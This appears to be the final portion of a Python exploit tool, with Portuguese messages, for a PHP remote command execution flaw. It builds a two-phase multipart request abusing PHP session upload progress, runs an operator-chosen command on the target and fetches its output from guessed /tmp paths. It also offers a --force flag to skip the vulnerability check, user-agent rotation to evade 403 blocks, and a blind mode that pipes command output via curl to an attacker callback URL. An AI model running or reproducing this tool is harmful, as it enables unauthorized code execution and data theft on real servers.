def multipart_payload(sid: str, cmd: bytes) -> Tuple[bytes, bytes, str]:
    test_boundary = BOUNDARY_619
    output_file = f"pwn_{uuid.uuid4().hex[:8]}.txt"
    full_cmd = f"({cmd.decode()}) > /tmp/{output_file} 2>&1".encode()
    pre = b"--" + test_boundary + b"\r\n"
    pre += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
    pre += sid.encode() + b"\r\n"
    pre += b"--" + test_boundary + b"\r\n"
    pre += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    pre += b"x\r\n"
    for i in range(N149_SPRAY):
        pre += b"--" + test_boundary + b"\r\n"
        pre += f'Content-Disposition: form-data; name="spray[{i}]"\r\n\r\n'.encode()
        pre += b"X" * (FORGE_BLOB + 64) + b"\r\n"
    pre += b"--" + test_boundary + b"\r\n"
    pre += b'Content-Disposition: form-data; name="cmd"; filename="exploit"\r\n\r\n'
    pre += full_cmd + b"\r\n"
    c1 = b"A" * (FILLUNIT + 64)
    phase1 = pre + c1
    phase2 = b"B" * (FILLUNIT + 64) + b"\r\n--" + test_boundary + b"--\r\n"
    return phase1, phase2, output_file

def exploit_target(target: Target, cmd: str, timeout: float = 30.0, insecure: bool = False, stall: float = 1.35, proxy: Optional[Tuple[str, int]] = None, user_agent: str = None, random_agent: bool = False) -> Tuple[bool, str]:
    print(f"\n{Colors.BLUE}[*]{Colors.RESET} Executando: {Colors.BOLD}{cmd}{Colors.RESET}")
    sid = f"sf619_{uuid.uuid4().hex[:12]}"

    exec_marker = f"EXEC_{uuid.uuid4().hex[:12]}"

    validation_cmd = f"echo {exec_marker}_START && ({cmd}) && echo {exec_marker}_END"

    p1, p2, output_file = multipart_payload(sid, validation_cmd.encode())
    total = len(p1) + len(p2)
    head = (
        f"POST {target.path} HTTP/1.1\r\nHost: {target.host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY_619.decode()}\r\n"
        f"Content-Length: {total}\r\nConnection: close\r\n\r\n"
    ).encode()
    sock = None
    try:
        sock = open_connection(target, timeout=timeout, insecure=insecure, proxy=proxy)
        send_all(sock, head + p1)
        print(f"{Colors.BLUE}[*]{Colors.RESET} Fase 1 enviada. Aguardando {stall}s...")
        time.sleep(stall)
        send_all(sock, p2)
        print(f"{Colors.BLUE}[*]{Colors.RESET} Fase 2 enviada...")
        raw = recv_http_response(sock, timeout=timeout)
    except Exception as e:
        print(f"{Colors.RED}[-]{Colors.RESET} Erro de conexão: {e}")
        return False, ""
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass

    code, _, _, _ = parse_http_response(raw)
    if code != 200:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} HTTP {code} - Servidor não respondeu como esperado")
        return False, ""

    print(f"{Colors.BLUE}[*]{Colors.RESET} Aguardando resultado (tentativa: ", end="")

    found_output = False
    output_content = ""

    for attempt in range(8):
        print(f"{attempt+1}/8)...", end=" ", flush=True)

        paths_to_try = [
            f"/tmp/{output_file}",
            f"/../tmp/{output_file}",
            f"/var/tmp/{output_file}",
            f"./tmp/{output_file}",
            f"/{output_file}",
        ]

        for path in paths_to_try:
            try:
                code, body, resp_headers, _ = http_request(
                    target, "GET", path,
                    timeout=timeout,
                    insecure=insecure,
                    proxy=proxy,
                    user_agent=user_agent,
                    random_agent=random_agent
                )

                if code == 200 and body:
                    output_str = body.decode('utf-8', errors='replace').strip()

                    if exec_marker in output_str:
                        start_idx = output_str.find(f"{exec_marker}_START")
                        end_idx = output_str.find(f"{exec_marker}_END")

                        if start_idx != -1 and end_idx != -1:
                            output_content = output_str[start_idx + len(f"{exec_marker}_START"):end_idx].strip()
                            found_output = True
                            break
                    elif output_str:
                        output_content = output_str
                        found_output = True
                        break
            except:
                pass

        if found_output:
            break

        if attempt < 7:
            time.sleep(1)

    print()

    if not found_output:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Arquivo de output não encontrado em nenhum caminho")
        print(f"{Colors.BLUE}[*]{Colors.RESET} Possíveis razões:")
        print(f"    - Comando pode ter sido executado às cegas (blind RCE)")
        print(f"    - Arquivo foi deletado automaticamente")
        print(f"    - Caminho do /tmp é diferente")
        print(f"    - Permissões impedem leitura")
        return False, ""

    if output_content:
        return True, output_content
    else:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Output vazio mas marcador detectado")
        return False, ""

def main():
    print(f"{Colors.CYAN}{ASCII_ART}{Colors.RESET}")
    ap = argparse.ArgumentParser(description=f"{CVE} - Detecção Avançada e Exploração")
    ap.add_argument("url", help="URL do alvo")
    ap.add_argument("-c", "--command", default="id", help="Comando a executar")
    ap.add_argument("--timeout", type=float, default=30.0, help="Timeout")
    ap.add_argument("--insecure", action="store_true", help="Ignorar SSL")
    ap.add_argument("--force", action="store_true", help="Forçar exploração")
    ap.add_argument("--stall", type=float, default=1.35, help="Delay entre fases")
    ap.add_argument("--callback", type=str, help="URL para callback (blind RCE)")
    ap.add_argument("--proxy", type=str, help="Proxy (ip:porta ou http://ip:porta)")
    ap.add_argument("--random-agent", action="store_true", help="Usar random User-Agent para bypass 403")

    args = ap.parse_args()
    target = Target.from_url(args.url)

    proxy = None
    if args.proxy:
        try:
            host, port = parse_proxy(args.proxy)
            proxy = (host, port)
            print(f"{Colors.BLUE}[*]{Colors.RESET} Proxy configurado: {host}:{port}")
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.RESET} Erro ao configurar proxy: {e}")
            return 1

    user_agent = None
    if args.random_agent:
        user_agent = generate_advanced_user_agent()
        print(f"{Colors.BLUE}[*]{Colors.RESET} User-Agent avançado: {user_agent}")

    assessment = advanced_vulnerability_detection(target, insecure=args.insecure, timeout=args.timeout, proxy=proxy, user_agent=user_agent, random_agent=args.random_agent)
    exploitable = print_assessment(assessment, target)
    if not exploitable and not args.force:
        return 1
    if exploitable or args.force:
        success, output = exploit_target(target, args.command, timeout=args.timeout, insecure=args.insecure, stall=args.stall, proxy=proxy, user_agent=user_agent, random_agent=args.random_agent)
        if success and output:
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} Output recebido:")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(output)
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
            return 0
        else:
            print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Nenhum output direto encontrado")
            if args.callback:
                print(f"{Colors.BLUE}[*]{Colors.RESET} Tentando RCE cego com callback em: {args.callback}")
                blind_cmd = f"({args.command}) | curl -d @- {args.callback} 2>/dev/null"
                success, _ = exploit_target(target, blind_cmd, timeout=args.timeout, insecure=args.insecure, stall=args.stall, proxy=proxy, user_agent=user_agent, random_agent=args.random_agent)
                if success:
                    print(f"{Colors.GREEN}[+]{Colors.RESET} Comando enviado para callback")
                    print(f"{Colors.BLUE}[*]{Colors.RESET} Verifique seu servidor de callback para a saída")
            else:
                print(f"{Colors.YELLOW}[!]{Colors.RESET} Pode ser RCE cego")
                print(f"{Colors.BLUE}[*]{Colors.RESET} Dica: Use --callback <URL> para blind RCE\n")
            return 0
    return 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrompido{Colors.RESET}\n")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] Erro: {e}{Colors.RESET}\n")
        sys.exit(1)
